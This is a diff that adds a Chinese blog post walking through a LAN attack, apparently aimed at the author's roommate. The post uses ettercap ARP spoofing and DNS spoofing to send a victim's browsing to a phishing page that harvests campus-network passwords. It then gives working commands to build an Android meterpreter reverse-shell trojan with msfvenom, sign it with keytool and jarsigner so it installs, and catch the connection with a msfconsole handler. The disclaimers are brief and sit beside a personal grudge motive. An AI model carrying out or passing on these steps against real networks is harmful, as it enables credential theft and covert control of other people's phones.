@@ -1,0 +1,853 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" href="/img/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#8c9ae6">
+  <meta name="author" content="HackerTerry">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言最近被室友熬夜打游戏搞得有些破防，正好最近在学习Kali Linux的使用，于是便想到了这一招。 下面我将演示如何借助 Kali Linux 系统内置的一款基于ARP地址欺骗的网络嗅探工具ettercap，对局域网内的 Win7 主机进行 DNS 域名劫持，从而使得受害主机访问任意网站的域名时跳转到 Kali 攻击机指定的恶意网页，实现网络钓鱼攻击。本实验为内网渗透，非公网IP上线。 不得非法">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Kali渗透（一）--DNS域名劫持与钓鱼">
+<meta property="og:url" content="https://rookieterry.github.io/2021/10/10/Kali%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%80%EF%BC%89-DNS%E5%9F%9F%E5%90%8D%E5%8A%AB%E6%8C%81%E4%B8%8E%E9%92%93%E9%B1%BC/index.html">
+<meta property="og:site_name" content="HackerTerry&#39;s Blog">
+<meta property="og:description" content="前言最近被室友熬夜打游戏搞得有些破防，正好最近在学习Kali Linux的使用，于是便想到了这一招。 下面我将演示如何借助 Kali Linux 系统内置的一款基于ARP地址欺骗的网络嗅探工具ettercap，对局域网内的 Win7 主机进行 DNS 域名劫持，从而使得受害主机访问任意网站的域名时跳转到 Kali 攻击机指定的恶意网页，实现网络钓鱼攻击。本实验为内网渗透，非公网IP上线。 不得非法">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2022/09/16/53rse4VSxRLu1Un.png">
+<meta property="article:published_time" content="2021-10-10T17:04:36.000Z">
+<meta property="article:modified_time" content="2022-09-17T08:37:51.000Z">
+<meta property="article:author" content="HackerTerry">
+<meta property="article:tag" content="kali渗透">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s2.loli.net/2022/09/16/53rse4VSxRLu1Un.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Kali渗透（一）--DNS域名劫持与钓鱼 - HackerTerry&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"rookieterry.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":null,"google":"UA-241125581-1","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript('https://www.google-analytics.com/analytics.js', function() {
+          window.ga = window.ga || function() { (ga.q = ga.q || []).push(arguments) };
+          ga.l = +new Date;
+          ga('create', 'UA-241125581-1', 'auto');
+          ga('send', 'pageview');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>HackerTerry&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/hacker.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Kali渗透（一）--DNS域名劫持与钓鱼"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        HackerTerry
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2021-10-10 18:04" pubdate>
+          星期日, 十月 10日 2021, 6:04 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          17 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Kali渗透（一）--DNS域名劫持与钓鱼</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2 年前
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近被室友熬夜打游戏搞得有些破防，正好最近在学习Kali Linux的使用，于是便想到了这一招。</p>
+<p>下面我将演示如何借助 Kali Linux 系统内置的一款基于ARP地址欺骗的网络嗅探工具ettercap，对局域网内的 Win7 主机进行 DNS 域名劫持，从而使得受害主机访问任意网站的域名时跳转到 Kali 攻击机指定的恶意网页，<strong>实现网络钓鱼攻击</strong>。本实验为内网渗透，非公网IP上线。 不得非法入侵他人设备，遵纪守法，天网恢恢疏而不漏。</p>
+<p><strong>环境</strong></p>
+<table>
+<thead>
+<tr>
+<th>主机</th>
+<th>角色</th>
+<th>IP地址</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Kali Linux 2021.3</td>
+<td>攻击者</td>
+<td>192.168.149.128</td>
+</tr>
+<tr>
+<td>Windows 7</td>
+<td>受害者</td>
+<td>192.168.149.129</td>
+</tr>
+<tr>
+<td>Windows 10</td>
+<td>受害者</td>
+<td>192.168.149.130</td>
+</tr>
+<tr>
+<td>（可以是远程服务器，也可以是kali攻击机）</td>
+<td>钓鱼服务器</td>
+<td>xxx.xxx.xxx.xxx</td>
+</tr>
+</tbody></table>
+<p><strong>DNS劫持</strong></p>
+<p>1.什么是DNS（域名）劫持</p>
+<p>DNS劫持又称域名劫持，是指在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则返回假的IP地址或者什么都不做使请求失去响应，其效果就是对特定的网络不能访问或访问的是假网址。</p>
+<p>2.DNS劫持的后果</p>
+<p>大规模的DNS劫持，其结果往往是断网，因为大网站的访问量实在太大了，钓鱼网站的服务器可能会扛不住大流量的访问，瞬间就会瘫痪掉，网民看到的结果就是网页打不开。网上购物、网上支付等敏感站点有可能会被恶意指向钓鱼网站，使得个人账户密码存在泄露的风险。</p>
+<p>3.本文域名劫持原理</p>
+<p>此次攻击的原理基于局域网内的ARP欺骗，ARP攻击就是通过伪造 IP 地址和 Mac 地址实现 ARP 欺骗，能够在网络中产生大量的 ARP 通信量使网络阻塞，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机 ARP 缓存中的IP-MAC 条目，造成网络中断或中间人攻击。</p>
+<blockquote>
+<p>本文的攻击本质就是使用Ettercap借助 ARP 欺骗攻击使得 Win 7 受害者主机误将攻击者主机 Kali 的 IP 当作网关 IP，然后 Kali 攻击机又将受害者访问的域名进一步指向了自己指定的 IP 地址，实现网络钓鱼攻击。</p>
+</blockquote>
+<h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>1.编辑ettercap的dns文件，在文件末尾添加下图红框内的两条解析（注意把IP地址改为钓鱼网站的），把受害者访问的所有网站都解析到钓鱼网站的IP地址上。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>ettercap/etter.dns<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/09/16/kj7B4mic13GfrwL.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>2.启动ettercap：</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ettercap -G</span><br></code></pre></td></tr></table></figure>
+
+<p>3.在vmware的“编辑-虚拟网络编辑器”中查看nat模式对应虚拟网卡（vmnet8）的默认网关，并在物理机的“网络连接”中设置vmnet8为下图所示（网段可能不同，根据实际情况更改）：</p>
+<p><img src="https://s2.loli.net/2022/09/16/4cMTNzHh7yIfGt9.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>4.配置ettercap网卡：</p>
+<p><img src="https://s2.loli.net/2022/09/16/mSjogFGTvLWezHE.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>5.扫描局域网内存活主机：</p>
+<p><img src="https://s2.loli.net/2022/09/16/QZ4DFVLHocUqj7B.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>6.选择网关并add to target 1，再选择目标并add to target 2：</p>
+<p><img src="https://s2.loli.net/2022/09/16/1ldhztbjAuovQpe.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>7.选择ARP攻击，并勾选第一项：</p>
+<p><img src="https://s2.loli.net/2022/09/16/Xq1FNS3Ghuy8Qpn.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://s2.loli.net/2022/09/16/QBT71kWYEfSLgt4.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>8.开启攻击后我们打开插件双击dns_spoof进行DNS毒化操作：</p>
+<p><img src="https://s2.loli.net/2022/09/16/vkJhz8FcGlxmdrb.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>9.点击开始按钮即可开始攻击：</p>
+<p><img src="https://s2.loli.net/2022/09/16/XEn8r19ZFjCzhfv.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>10.受害者访问任意网页，都会被强制跳转到提前搭建好的钓鱼网站：</p>
+<p><img src="https://s2.loli.net/2022/09/16/53rse4VSxRLu1Un.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>搭配后端PHP代码连接数据库，可以获得受害者的校园网账号和密码。不过，我们的目的是诱导受害者下载木马并使其上线。这里我们要用到msf来生成安卓木马：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">msfvenom -p android<span class="hljs-regexp">/meterpreter/</span>reverse_tcp LHOST=kali本机ip LPORT=监听端口 R &gt; <span class="hljs-regexp">/放置的目录/</span>文件名.apk<br></code></pre></td></tr></table></figure>
+
+<p>因为现在很多手机都不会安装未签名的apk文件，所以我们可以用Android Killer对木马的图标、名字进行修改和签名。当然，也可以使用命令:</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">生成授权签名<br>keytool -genkey -v -keystore apk-trojan-key.keystore -alias aliasname -keyalg RSA -keysize <span class="hljs-number">1024</span> -validity <span class="hljs-number">999</span><br><br><span class="hljs-keyword">jarsigner </span>-verbose -sigalg <span class="hljs-keyword">SHA1withRSA </span>-<span class="hljs-keyword">digestalg </span><span class="hljs-keyword">SHA1 </span>-keystore apk-trojan-key.keystore 文件名.apk aliasname<br><br>验证签名<br><span class="hljs-keyword">jarsigner </span>-verify 文件名.apk<br></code></pre></td></tr></table></figure>
+
+<p>11.msf设置监听：</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams">msfconsole<br>use exploit/multi/handler<br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">android</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LHOST 192.168.149.128</span> //<span class="hljs-comment">kali</span>本机的<span class="hljs-comment">ip</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LPORT 9055</span>  //监听上线的端口 需要与生成木马的时候填写一样<br>exploit   //执行监听<br></code></pre></td></tr></table></figure>
+
+<p>当目标上线之后，我们就可以停止ARP攻击了。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>安卓木马的功能不仅仅只有这么一些，剩下的东西也是需要大家自己去摸索的。本次教程到此结束，最后还是要提醒大家不要做出违法的事情，谢谢！</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/" class="category-chain-item">无线安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/kali%E6%B8%97%E9%80%8F/">#kali渗透</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Kali渗透（一）--DNS域名劫持与钓鱼</div>
+      <div>https://rookieterry.github.io/2021/10/10/Kali渗透（一）-DNS域名劫持与钓鱼/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>HackerTerry</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>星期日, 十月 10日 2021, 6:04 晚上</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                    <i class="iconfont icon-nc"></i>
+                  </span>
+                </a>
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="SA - 相同方式共享">
+                    <i class="iconfont icon-sa"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/10/13/Web%E6%BC%8F%E6%B4%9E%E7%BB%BC%E5%90%88/" title="Web漏洞综合">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Web漏洞综合</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/10/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%88%E4%B8%89%EF%BC%89-WAF%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/" title="文件上传（三）--WAF绕过思路">
+                        <span class="hidden-mobile">文件上传（三）--WAF绕过思路</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <div id="twikoo"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/twikoo/1.6.7/twikoo.all.min.js', function() {
+        var options = Object.assign(
+          {"envId":"https://twikoo.terrynet.live/","region":"ap-shanghai","path":"window.location.pathname"},
+          {
+            el: '#twikoo',
+            path: 'window.location.pathname',
+            onCommentLoaded: function() {
+              var imgSelector = '#twikoo .tk-content img:not(.tk-owo-emotion)';
+              Fluid.plugins.imageCaption(imgSelector);
+              Fluid.plugins.fancyBox(imgSelector);
+            }
+          }
+        )
+        twikoo.init(options)
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a><br> <a href="https://ipw.cn/ipv6webcheck/?site=hackerterry.netlify.app" title="本站支持IPv6访问" target="_blank"><img style="display:inline-block;vertical-align:middle" alt="本站支持IPv6访问" src="https://static.ipw.cn/icon/ipv6-s5.svg" srcset="/img/loading.gif" lazyload></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
